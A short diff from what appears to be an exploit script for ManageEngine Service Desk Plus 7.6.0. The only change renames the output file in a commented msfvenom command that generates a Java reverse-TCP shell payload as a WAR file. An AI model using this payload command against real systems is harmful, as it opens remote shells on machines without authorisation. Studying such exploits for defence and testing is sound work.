@@ -52,7 +52,7 @@ def banner():
 # Ported by: Andrea Bruschi
 # Tested on: MS Windows 2008 Server and ManageEngine Service Desk Plus 7.6.0
 
-# payload gen: msfvenom -p java/shell_reverse_tcp LHOST=<ip address> LPORT=4444 -f war > shelljsp.war
+# payload gen: msfvenom -p java/shell_reverse_tcp LHOST=<ip address> LPORT=4444 -f war > shell.war
 
 """)
 
